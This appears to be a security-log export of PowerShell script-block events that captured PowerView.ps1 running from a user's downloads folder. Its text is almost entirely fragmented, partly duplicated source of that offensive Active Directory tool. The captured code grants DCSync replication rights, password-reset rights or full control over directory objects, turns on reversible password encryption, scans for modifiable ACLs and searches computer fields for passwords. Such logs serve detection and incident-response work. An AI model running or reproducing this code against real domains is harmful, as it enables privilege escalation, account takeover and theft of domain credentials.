$RightsSearcher.FindAll() | Where-Object {$_} | ForEach-Object {                # convert the GUID                $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]            }        }        catch {            Write-Debug ""Error in building GUID map: $_""        }    }    $GUIDs}function Get-NetComputer {<#    .SYNOPSIScriptBlock ID: 1a3d4436-4580-464d-b9fd-fe2a68b82ecaPath: C:\Users\michael.ascot\downloads\PowerView.ps1","-","-","-","UIDs, map them them to the resolved hash table                        $AclProperties = @{}                        $_.psobject.properties | ForEach-Object {                            if( ($_.Name -eq 'ObjectType') -or ($_.Name -eq 'InheritedObjectType') ) {                                try {                                    $AclProperties[$_.Name] = $GUIDS[$_.Value.toString()]                                }                                catch {                                    $AclProperties[$_.Name] = $_.Value                                }                            }                            else {                                $AclProperties[$_.Name] = $_.Value                            }                        }                        New-Object -TypeName PSObject -Property $AclProperties                    }                    else { $_ }                }            }            catch {                Write-Warning $_            }        }    }}function Add-ObjectAcl {<#    .SYNOPSIS        Adds an ACL for a specific active directory object.                AdminSDHolder ACL approach from Sean Metcalf (@pyrotek3)            https://adsecurity.org/?p=1906        ACE setting method adapted from https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects.        'ResetPassword' doesn't need to know the user's current password        'WriteMembers' allows for the modification of group membership    .PARAMETER TargetSamAccountName        Target object name to filter for.            .PARAMETER TargetName        Target object name to filter for.    .PARAMETER TargetDistinguishedName        Target object distinguished name to filter for.    .PARAMETER TargetFilter        A customized ldap filter string to use to find a target, e.g. ""(description=*admin*)""    .PARAMETER TargetADSpath        The LDAP source for the target, e.g. ""LDAP://OU=secret,DC=testlab,DC=local""    .PARAMETER TargetADSprefix        Prefix to set for the target searcher (like ""CN=Sites,CN=Configuration"")    .PARAMETER PrincipalSID        The SID of the principal object to add for access.    .PARAMETER PrincipalName        The name of the principal object to add for access.    .PARAMETER PrincipalSamAccountName        The samAccountName of the principal object to add for access.    .PARAMETER Rights        Rights to add for the principal, ""All"",""ResetPassword"",""WriteMembers"",""DCSync""    .PARAMETER Domain        The domain to use for the target query, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        Add-ObjectAcl -TargetSamAccountName matt -PrincipalSamAccountName john        Grants 'john' all full access rights to the 'matt' account.    .EXAMPLE        Add-ObjectAcl -TargetSamAccountName matt -PrincipalSamAccountName john -Rights ResetPassword        Grants 'john' the right to reset the password for the 'matt' account.    .LINK        https://adsecurity.org/?p=1906                https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects?forum=winserverpowershell#>    [CmdletBinding()]    Param (        [String]        $TargetSamAccountName,        [String]        $TargetName = ""*"",        [Alias('DN')]        [String]        $TargetDistinguishedName = ""*"",        [String]        $TargetFilter,        [String]        $TargetADSpath,        [String]        $TargetADSprefix,        [String]        [ValidatePattern('^S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+')]        $PrincipalSID,        [String]        $PrincipalName,        [String]        $PrincipalSamAccountName,        [String]        [ValidateSet(""All"",""ResetPassword"",""WriteMembers"",""DCSync"")]        $Rights = ""All"",        [String]        $RightsGUID,        [String]        $Domain,        [String]        $DomainController,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    begin {        $Searcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $TargetADSpath -ADSprefix $TargetADSprefix -PageSize $PageSize        if(!$PrincipalSID) {            $Principal = Get-ADObject -Domain $Domain -DomainController $DomainController -Name $PrincipalName -SamAccountName $PrincipalSamAccountName -PageSize $PageSize                        if(!$Principal) {                throw ""Error resolving principal""            }            $PrincipalSID = $Principal.objectsid        }        if(!$PrincipalSID) {            throw ""Error resolving principal""        }    }    process {        if ($Searcher) {            if($TargetSamAccountName) {                $Searcher.filter=""(&(samaccountname=$TargetSamAccountName)(name=$TargetName)(distinguishedname=$TargetDistinguishedName)$TargetFilter)""              }            else {                $Searcher.filter=""(&(name=$TargetName)(distinguishedname=$TargetDistinguishedName)$TargetFilter)""              }              try {                $Searcher.FindAll() | Where-Object {$_} | Foreach-Object {                    # adapted from https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects                    $TargetDN = $_.Properties.distinguishedname                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalSID)                    $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] ""None""                    $ControlType = [System.Security.AccessControl.AccessControlType] ""Allow""                    $ACEs = @()                    if($RightsGUID) {                        $GUIDs = @($RightsGUID)                    }                    else {                        $GUIDs = Switch ($Rights) {                            # ResetPassword doesn't need to know the user's current password                            ""ResetPassword"" { ""00299570-246d-11d0-a768-00aa006e0529"" }                            # allows for the modification of group membership                            ""WriteMembers"" { ""bf9679c0-0de6-11d0-a285-00aa003049e2"" }                            # 'DS-Replication-Get-Changes' = 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2                            # 'DS-Replication-Get-Changes-All' = 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2                            # 'DS-Replication-Get-Changes-In-Filtered-Set' = 89e95b76-444d-4c62-991a-0facbeda640c                            #   when applied to a domain's ACL, allows for the use of DCSync                            ""DCSync"" { ""1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"", ""1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"", ""89e95b76-444d-4c62-991a-0facbeda640c""}                        }                    }                    if($GUIDs) {                        foreach($GUID in $GUIDs) {                            $NewGUID = New-Object Guid $GUID                            $ADRights = [System.DirectoryServices.ActiveDirectoryRights] ""ExtendedRight""                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity,$ADRights,$ControlType,$NewGUID,$InheritanceType                        }                    }                    else {                        # deault to GenericAll rights                        $ADRights = [System.DirectoryServices.ActiveDirectoryRights] ""GenericAll""                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity,$ADRights,$ControlType,$InheritanceType                    }                    Write-Verbose ""Granting principal $PrincipalSID '$Rights' on $($_.Properties.distinguishedname)""                    try {                        # add all the new ACEs to the specified object                        ForEach ($ACE in $ACEs) {                            Write-Verbose ""Granting principal $PrincipalSID '$($ACE.ObjectType)' rights on $($_.Properties.distinguishedname)""                            $Object = [adsi]($_.path)                            $Object.PsBase.ObjectSecurity.AddAccessRule($ACE)                            $Object.PsBase.commitchanges()                        }                    }                    catch {                        Write-Warning ""Error granting principal $PrincipalSID '$Rights' on $TargetDN : $_""                    }                }            }            catch {                Write-Warning ""Error: $_""            }        }    }}function Invoke-ACLScanner {<#    .SYNOPSIS        Searches for ACLs for specifable AD objects (default to all domain objects)        with a domain sid of > -1000, and have modifiable rights.        Thanks Sean Metcalf (@pyrotek3) for the idea and guidance.    .PARAMETER SamAccountName        Object name to filter for.            .PARAMETER Name        Object name to filter for.    .PARAMETER DistinguishedName        Object distinguished name to filter for.    .PARAMETER Filter        A customized ldap filter string to use, e.g. ""(description=*admin*)""         .PARAMETER ADSpath        The LDAP source to search through, e.g. ""LDAP://OU=secret,DC=testlab,DC=local""        Useful for OU queries.    .PARAMETER ADSprefix        Prefix to set for the searcher (like ""CN=Sites,CN=Configuration"")    .PARAMETER Domain        The domain to use for the query, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER ResolveGUIDs        Switch. Resolve GUIDs to their display names.    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Invoke-ACLScanner -ResolveGUIDs | Export-CSV -NoTypeInformation acls.csv        Enumerate all modifable ACLs in the current domain, resolving GUIDs to display         names, and export everything to a .csv#>    [CmdletBinding()]    Param (        [Parameter(ValueFromPipeline=$True)]        [String]        $SamAccountName,        [String]        $Name = ""*"",        [Alias('DN')]        [String]        $DistinguishedName = ""*"",        [String]        $Filter,        [String]        $ADSpath,        [String]        $ADSprefix,        [String]        $Domain,        [String]        $DomainController,        [Switch]        $ResolveGUIDs,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    # Get all domain ACLs with the appropriate parameters    Get-ObjectACL @PSBoundParameters | ForEach-Object {        # add in the translated SID for the object identity        $_ | Add-Member Noteproperty 'IdentitySID' ($_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]).Value)        $_    } | Where-Object {        # check for any ACLs with SIDs > -1000        try {            [int]($_.IdentitySid.split(""-"")[-1]) -ge 1000        }        catch {}    } | Where-Object {        # filter for modifiable rights        ($_.ActiveDirectoryRights -eq ""GenericAll"") -or ($_.ActiveDirectoryRights -match ""Write"") -or ($_.ActiveDirectoryRights -match ""Create"") -or ($_.ActiveDirectoryRights -match ""Delete"") -or (($_.ActiveDirectoryRights -match ""ExtendedRight"") -and ($_.AccessControlType -eq ""Allow""))    }}function Get-GUIDMap {<#    .SYNOPSIS        Helper to build a hash table of [GUID] -> resolved names        Heavily adapted from http://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-permissions-report-free-powershell-script-download.aspx    .PARAMETER Domain            The domain to use for the query, defaults to the current domain.    .PARAMETER DomainController            Domain controller to reflect LDAP queries through.    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .LINK        http://blogs.technet.com/b/ashleymcglone/archive/2013/03/25/active-directory-ou-permissions-report-free-powershell-script-download.aspx#>    [CmdletBinding()]    Param (        [String]        $Domain,        [String]        $DomainController,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    $GUIDs = @{'00000000-0000-0000-0000-000000000000' = 'All'}    $SchemaPath = (Get-NetForest).schema.name    $SchemaSearcher = Get-DomainSearcher -ADSpath $SchemaPath -DomainController $DomainController -PageSize $PageSize    if($SchemaSearcher) {        $SchemaSearcher.filter = ""(schemaIDGUID=*)""        try {            $SchemaSearcher.FindAll() | Where-Object {$_} | ForEach-Object {                # convert the GUID                $GUIDs[(New-Object Guid (,$_.properties.schemaidguid[0])).Guid] = $_.properties.name[0]            }        }        catch {            Write-Debug ""Error in building GUID map: $_""        }          }    $RightsSearcher = Get-DomainSearcher -ADSpath $SchemaPath.replace(""Schema"",""Extended-Rights"") -DomainController $DomainController -PageSize $PageSize    if ($RightsSearcher) {        $RightsSearcher.filter = ""(objectClass=controlAccessRight)""        try {            $RightsSearcher.FindAll() | Where-Object {$_} | ForEach-Object {                # convert the GUID                $GUIDs[$_.properties.rightsguid[0].toString()] = $_.properties.name[0]            }        }        catch {            Write-Debug ""Error in building GUID map: $_""        }    }    $GUIDs}function Get-NetComputer {<#    .SYNOPSI","-","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:39:32.304","3,728"
"CXV3ypsB8mE-0EyZwX-W","-",logs,"-","-","-",powershell,"-","-","-","-","Execute a Remote Command","-","C:\Users\michael.ascot\downloads\PowerView.ps1","win-3450","Creating Scriptblock text (9 of 26):set the forced password change            Set-ADObject @Arguments -PropertyName pwdlastset -PropertyValue -1        }        else {            if($UACValues.Keys -contains ""DONT_EXPIRE_PASSWORD"") {                # if the password is set to never expire, unset                Set-ADObject @Arguments -PropertyName useraccountcontrol -PropertyXorValue 65536            }            if($UACValues.Keys -notcontains ""ENCRYPTED_TEXT_PWD_ALLOWED"") {                # if reversible encryption is not set, set it                Set-ADObject @Arguments -PropertyName useraccountcontrol -PropertyXorValue 128            }            # force the password to be changed on next login            Set-ADObject @Arguments -PropertyName pwdlastset -PropertyValue 0        }    }}function Get-ComputerProperty {<#    .SYNOPSIS        Returns a list of all computer object properties. If a property        name is specified, it returns all [computer:property] values.        Taken directly from @obscuresec's post:            http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html    .PARAMETER Properties        Return property names for computers.    .PARAMETER Domain        The domain to query for computer properties, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Get-ComputerProperty -Domain testing                Returns all user properties for computers in the 'testing' domain.    .EXAMPLE        PS C:\> Get-ComputerProperty -Properties ssn,lastlogon,location                Returns all an array of computer/ssn/lastlogin/location combinations        for computers in the current domain.    .LINK        http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html#>    [CmdletBinding()]    param(        [String[]]        $Properties,        [String]        $Domain,        [String]        $DomainController,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    if($Properties) {        # extract out the set of all properties for each object        $Properties = ,""name"" + $Properties | Sort-Object -Unique        Get-NetComputer -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize | Select-Object -Property $Properties    }    else {        # extract out just the property names        Get-NetComputer -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize | Select-Object -first 1 | Get-Member -MemberType *Property | Select-Object -Property ""Name""    }}function Find-ComputerField {<#    .SYNOPSIS        Searches computer object fields for a given word (default *pass*). Default        field being searched is 'description'.        Taken directly from @obscuresec's post:            http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html    .PARAMETER SearchTerm        Term to search for, default of ""pass"".    .PARAMETER SearchField        User field to search in, default of ""description"".    .PARAMETER ADSpath        The LDAP source to search through, e.g. ""LDAP://OU=secret,DC=testlab,DC=local""        Useful for OU queries.    .PARAMETER Domain        Domain to search computer fields for, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Find-ComputerField -SearchTerm backup -SearchField info        Find computer accounts with ""backup"" in the ""info"" field.#>    [CmdletBinding()]    param(        [Parameter(Position=0,ValueFromPipeline=$True)]        [Alias('Term')]        [String]        $SearchTerm = 'pass',        [Alias('Field')]        [String]        $SearchField = 'description',        [String]        $ADSpath,        [String]        $Domain,        [String]        $DomainController,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    process {        Get-NetComputer -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -FullData -Filter ""($SearchField=*$SearchTerm*)"" -PageSize $PageSize | Select-Object samaccountname,$SearchField    }}function Get-NetOU {<#    .SYNOPSIS        Gets a list of all current OUs in a domain.    .PARAMETER OUName        The OU name to query for, wildcards accepted.    .PARAMETER GUID        Only return OUs with the specified GUID in their gplink property.    .PARAMETER Domain        The domain to query for OUs, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER ADSpath        The LDAP source to search through.    .PARAMETER FullData        Switch. Return full OU objects instead of just object names (the default).    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Get-NetOU                Returns the current OUs in the domain.    .EXAMPLE        PS C:\> Get-NetOU -OUName *admin* -Domain testlab.local                Returns all OUs with ""admin"" in their name in the testlab.local domain.     .EXAMPLE        PS C:\> Get-NetOU -GUID 123-...                Returns all OUs with linked to the specified group policy object.    #>    [CmdletBinding()]    Param (        [Parameter(ValueFromPipeline=$True)]        [String]        $OUName = '*',        [String]        $GUID,        [String]        $Domain,        [String]        $DomainController,        [String]        $ADSpath,        [Switch]        $FullData,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    begin {        $OUSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize    }    process {        if ($OUSearcher) {            if ($GUID) {                # if we're filtering for a GUID in .gplink                $OUSearcher.filter=""(&(objectCategory=organizationalUnit)(name=$OUName)(gplink=*$GUID*))""            }            else {                $OUSearcher.filter=""(&(objectCategory=organizationalUnit)(name=$OUName))""            }            $OUSearcher.FindAll() | Where-Object {$_} | ForEach-Object {                if ($FullData) {                    # convert/process the LDAP fields for each result                    Convert-LDAPProperty -Properties $_.Properties                }                else {                     # otherwise just returning the ADS paths of the OUs                    $_.properties.adspath                }            }        }    }}function Get-NetSite {<#    .SYNOPSIS        Gets a list of all current sites in a domain.    .PARAMETER SiteName        Site filter string, wildcards accepted.    .PARAMETER Domain        The domain to query for sites, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER ADSpath        The LDAP source to search through.    .PARAMETER GUID        Only return site with the specified GUID in their gplink property.    .PARAMETER FullData        Switch. Return full site objects instead of just object names (the default).    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Get-NetSite -Domain testlab.local -FullData                Returns the full data objects for all sites in testlab.local#>    [CmdletBinding()]    Param (        [Parameter(ValueFromPipeline=$True)]        [String]        $SiteName = ""*"",        [String]        $Domain,        [String]        $DomainController,        [String]        $ADSpath,        [String]        $GUID,        [Switch]        $FullData,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    begin {        $SiteSearcher = Get-DomainSearcher -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -ADSprefix ""CN=Sites,CN=Configuration"" -PageSize $PageSize    }    process {        if($SiteSearcher) {            if ($GUID) {                # if we're filtering for a GUID in .gplink                $SiteSearcher.filter=""(&(objectCategory=site)(name=$SiteName)(gplink=*$GUID*))""            }            else {                $SiteSearcher.filter=""(&(objectCategory=site)(name=$SiteName))""            }                        try {                $SiteSearcher.FindAll() | Where-Object {$_} | ForEach-Object {                    if ($FullData) {                        # convert/process the LDAP fields for each result                        Convert-LDAPProperty -Properties $_.Properties                    }                    else {                        # otherwise just return the site name                        $_.properties.name                    }                }            }            catch {                Write-Warning $_            }        }    }}function Get-NetSubnet {<#    .SYNOPSIS        Gets a list of all current subnets in a domain.    .PARAMETER SiteName        Only return subnets from the specified SiteName.    .PARAMETER Domain        The domain to query for subnets, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER ADSpath        The LDAP source to search through.    .PARAMETER FullData        Switch. Return full subnet objects instead of just object names (the default).    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Get-NetSubnet                Returns all subnet names in the current domain.    .EXAMPLE        PS C:\> Get-NetSubnet -Domain testlab.local -FullData                Returns the full data objects for all subnets in testlab.local#>    [CmdletBinding()]    Param (        [Parameter(ValueFromPipeline=$True)]        [String]        $SiteName = ""*"",        [String]        $Domain,        [String]        $ADSpath,        [String]        $DomainController,        [Switch]        $FullData,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    begin {        $SubnetSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -ADSprefix ""CN=Subnets,CN=Sites,CN=Configuration"" -PageSize $PageSize    }    process {        if($SubnetSearcher) {            $SubnetSearcher.filter=""(&(objectCategory=subnet))""            try {                $SubnetSearcher.FindAll() | Where-Object {$_} | ForEach-Object {                    if ($FullData) {                        # convert/process the LDAP fields for each result                        Convert-LDAPProperty -Properties $_.Properties | Where-Object { $_.siteobject -match ""CN=$SiteName"" }                    }                    else {                        # otherwise just return the subnet name and site name                        if ( ($SiteName -and ($_.properties.siteobject -match ""CN=$SiteName,"")) -or ($SiteName -eq '*')) {                            $SubnetProperties = @{                                'Subnet' = $_.properties.name[0]                            }                            try {                                $SubnetProperties['Site'] = ($_.properties.siteobject[0]).split("","")[0]                            }                            catch {                                $SubnetProperties['Site'] = 'Error'                            }                            New-Object -TypeName PSObject -Property $SubnetProperties                                         }                    }                }            }            catch {                Write-Warning $_            }        }    }}function Get-DomainSID {<#    .SYNOPSIS        Gets the SID for the domain.    .PARAMETER Domain        The domain to query, defaults to the current domain.    .EXAMPLE        C:\> Get-DomainSID -Domain TEST                Returns SID for the domain 'TEST'#>    param(        [String]        $Domain    )    $FoundDomain = Get-NetDomain -Domain $Domain        if($FoundDomain) {        # query for the primary domain controller so we can extract the domain SID for filtering        $PrimaryDC = $FoundDomain.PdcRoleOwner        $PrimaryDCSID = (Get-NetComputer -Domain $Domain -ComputerName $PrimaryDC -FullData).objectsid        $Parts = $PrimaryDCSID.split(""-"")        $Parts[0..($Parts.length -2)] -join ""-""    }}function Get-NetGroup {<#    .SYNOPSIS        Gets a list of all current groups in a domain, or all        the groups a given user/group object belongs to.    .PARAMETER GroupName        The group name to query for, wildcards accepted.    .PARAMETER SID        The group SID to query for.    .PARAMETER UserName        The user name (or group name) to query for all effective        groups of.    .PARAMETER Filter        A customized ldap filter string to use, e.g. ""(description=*admin*)""    .PARAMETER Domain        The domain to query for groups, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER ADSpath        The LDAP source to search through, e.g. ""LDAP://OU=secret,DC=testlab,DC=local""        Useful for OU queries.    .PARAMETER AdminCount        Switch. Return group with adminCount=1.    .PARAMETER FullData        Switch. Return full group objects instead of just object names (the default).    .PARAMETER RawSids        Switch. Return raw SIDs when using ""Get-NetGroup -UserName ScriptBlock ID: 1a3d4436-4580-464d-b9fd-fe2a68b82ecaPath: C:\Users\michael.ascot\downloads\PowerView.ps1","-","-","-","set the forced password change            Set-ADObject @Arguments -PropertyName pwdlastset -PropertyValue -1        }        else {            if($UACValues.Keys -contains ""DONT_EXPIRE_PASSWORD"") {                # if the password is set to never expire, unset                Set-ADObject @Arguments -PropertyName useraccountcontrol -PropertyXorValue 65536            }            if($UACValues.Keys -notcontains ""ENCRYPTED_TEXT_PWD_ALLOWED"") {                # if reversible encryption is not set, set it                Set-ADObject @Arguments -PropertyName useraccountcontrol -PropertyXorValue 128            }            # force the password to be changed on next login            Set-ADObject @Arguments -PropertyName pwdlastset -PropertyValue 0        }    }}function Get-ComputerProperty {<#    .SYNOPSIS        Returns a list of all computer object properties. If a property        name is specified, it returns all [computer:property] values.        Taken directly from @obscuresec's post:            http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html    .PARAMETER Properties        Return property names for computers.    .PARAMETER Domain        The domain to query for computer properties, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Get-ComputerProperty -Domain testing                Returns all user properties for computers in the 'testing' domain.    .EXAMPLE        PS C:\> Get-ComputerProperty -Properties ssn,lastlogon,location                Returns all an array of computer/ssn/lastlogin/location combinations        for computers in the current domain.    .LINK        http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html#>    [CmdletBinding()]    param(        [String[]]        $Properties,        [String]        $Domain,        [String]        $DomainController,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    if($Properties) {        # extract out the set of all properties for each object        $Properties = ,""name"" + $Properties | Sort-Object -Unique        Get-NetComputer -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize | Select-Object -Property $Properties    }    else {        # extract out just the property names        Get-NetComputer -Domain $Domain -DomainController $DomainController -FullData -PageSize $PageSize | Select-Object -first 1 | Get-Member -MemberType *Property | Select-Object -Property ""Name""    }}function Find-ComputerField {<#    .SYNOPSIS        Searches computer object fields for a given word (default *pass*). Default        field being searched is 'description'.        Taken directly from @obscuresec's post:            http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html    .PARAMETER SearchTerm        Term to search for, default of ""pass"".    .PARAMETER SearchField        User field to search in, default of ""description"".    .PARAMETER ADSpath        The LDAP source to search through, e.g. ""LDAP://OU=secret,DC=testlab,DC=local""        Useful for OU queries.    .PARAMETER Domain        Domain to search computer fields for, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Find-ComputerField -SearchTerm backup -SearchField info        Find computer accounts with ""backup"" in the ""info"" field.#>    [CmdletBinding()]    param(        [Parameter(Position=0,ValueFromPipeline=$True)]        [Alias('Term')]        [String]        $SearchTerm = 'pass',        [Alias('Field')]        [String]        $SearchField = 'description',        [String]        $ADSpath,        [String]        $Domain,        [String]        $DomainController,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    process {        Get-NetComputer -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -FullData -Filter ""($SearchField=*$SearchTerm*)"" -PageSize $PageSize | Select-Object samaccountname,$SearchField    }}function Get-NetOU {<#    .SYNOPSIS        Gets a list of all current OUs in a domain.    .PARAMETER OUName        The OU name to query for, wildcards accepted.    .PARAMETER GUID        Only return OUs with the specified GUID in their gplink property.    .PARAMETER Domain        The domain to query for OUs, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER ADSpath        The LDAP source to search through.    .PARAMETER FullData        Switch. Return full OU objects instead of just object names (the default).    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Get-NetOU                Returns the current OUs in the domain.    .EXAMPLE        PS C:\> Get-NetOU -OUName *admin* -Domain testlab.local                Returns all OUs with ""admin"" in their name in the testlab.local domain.     .EXAMPLE        PS C:\> Get-NetOU -GUID 123-...                Returns all OUs with linked to the specified group policy object.    #>    [CmdletBinding()]    Param (        [Parameter(ValueFromPipeline=$True)]        [String]        $OUName = '*',        [String]        $GUID,        [String]        $Domain,        [String]        $DomainController,        [String]        $ADSpath,        [Switch]        $FullData,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    begin {        $OUSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -PageSize $PageSize    }    process {        if ($OUSearcher) {            if ($GUID) {                # if we're filtering for a GUID in .gplink                $OUSearcher.filter=""(&(objectCategory=organizationalUnit)(name=$OUName)(gplink=*$GUID*))""            }            else {                $OUSearcher.filter=""(&(objectCategory=organizationalUnit)(name=$OUName))""            }            $OUSearcher.FindAll() | Where-Object {$_} | ForEach-Object {                if ($FullData) {                    # convert/process the LDAP fields for each result                    Convert-LDAPProperty -Properties $_.Properties                }                else {                     # otherwise just returning the ADS paths of the OUs                    $_.properties.adspath                }            }        }    }}function Get-NetSite {<#    .SYNOPSIS        Gets a list of all current sites in a domain.    .PARAMETER SiteName        Site filter string, wildcards accepted.    .PARAMETER Domain        The domain to query for sites, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER ADSpath        The LDAP source to search through.    .PARAMETER GUID        Only return site with the specified GUID in their gplink property.    .PARAMETER FullData        Switch. Return full site objects instead of just object names (the default).    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Get-NetSite -Domain testlab.local -FullData                Returns the full data objects for all sites in testlab.local#>    [CmdletBinding()]    Param (        [Parameter(ValueFromPipeline=$True)]        [String]        $SiteName = ""*"",        [String]        $Domain,        [String]        $DomainController,        [String]        $ADSpath,        [String]        $GUID,        [Switch]        $FullData,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    begin {        $SiteSearcher = Get-DomainSearcher -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -ADSprefix ""CN=Sites,CN=Configuration"" -PageSize $PageSize    }    process {        if($SiteSearcher) {            if ($GUID) {                # if we're filtering for a GUID in .gplink                $SiteSearcher.filter=""(&(objectCategory=site)(name=$SiteName)(gplink=*$GUID*))""            }            else {                $SiteSearcher.filter=""(&(objectCategory=site)(name=$SiteName))""            }                        try {                $SiteSearcher.FindAll() | Where-Object {$_} | ForEach-Object {                    if ($FullData) {                        # convert/process the LDAP fields for each result                        Convert-LDAPProperty -Properties $_.Properties                    }                    else {                        # otherwise just return the site name                        $_.properties.name                    }                }            }            catch {                Write-Warning $_            }        }    }}function Get-NetSubnet {<#    .SYNOPSIS        Gets a list of all current subnets in a domain.    .PARAMETER SiteName        Only return subnets from the specified SiteName.    .PARAMETER Domain        The domain to query for subnets, defaults to the current domain.    .PARAMETER DomainController        Domain controller to reflect LDAP queries through.    .PARAMETER ADSpath        The LDAP source to search through.    .PARAMETER FullData        Switch. Return full subnet objects instead of just object names (the default).    .PARAMETER PageSize        The PageSize to set for the LDAP searcher object.    .EXAMPLE        PS C:\> Get-NetSubnet                Returns all subnet names in the current domain.    .EXAMPLE        PS C:\> Get-NetSubnet -Domain testlab.local -FullData                Returns the full data objects for all subnets in testlab.local#>    [CmdletBinding()]    Param (        [Parameter(ValueFromPipeline=$True)]        [String]        $SiteName = ""*"",        [String]        $Domain,        [String]        $ADSpath,        [String]        $DomainController,        [Switch]        $FullData,        [ValidateRange(1,10000)]         [Int]        $PageSize = 200    )    begin {        $SubnetSearcher = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -ADSprefix ""CN=Subnets,CN=Sites,CN=Configuration"" -PageSize $PageSize    }    process {        if($SubnetSearcher) {            $SubnetSearcher.filter=""(&(objectCategory=subnet))""            try {                $SubnetSearcher.FindAll() | Where-Object {$_} | ForEach-Object {                    if ($FullData) {                        # convert/process the LDAP fields for each result                        Convert-LDAPProperty -Properties $_.Properties | Where-Object { $_.siteobject -match ""CN=$SiteName"" }                    }                    else {                        # otherwise just return the subnet name and site name                        if ( ($SiteName -and ($_.properties.siteobject -match ""CN=$SiteName,"")) -or ($SiteName -eq '*')) {                            $SubnetProperties = @{                                'Subnet' = $_.properties.name[0]                            }                            try {                                $SubnetProperties['Site'] = ($_.properties.siteobject[0]).split("","")[0]                            }                            catch {                                $SubnetProperties['Site'] = 'Error'                            }                            New-Object -TypeName PSObject -Property $SubnetProperties                                         }                    }                }            }            catch {                Write-Warning $_            }        }    }}function Get-DomainSID {<#    .SYNOPSIS        Gets the SID for the domain.    .PARAMETER Domain        The domain to query, defaults to the current domain.    .EXAMPLE        C:\> Get-DomainSID -Domain TEST                Returns SID for the domain 'TEST'#>    param(        [String]        $Domain    )    $FoundDomain = 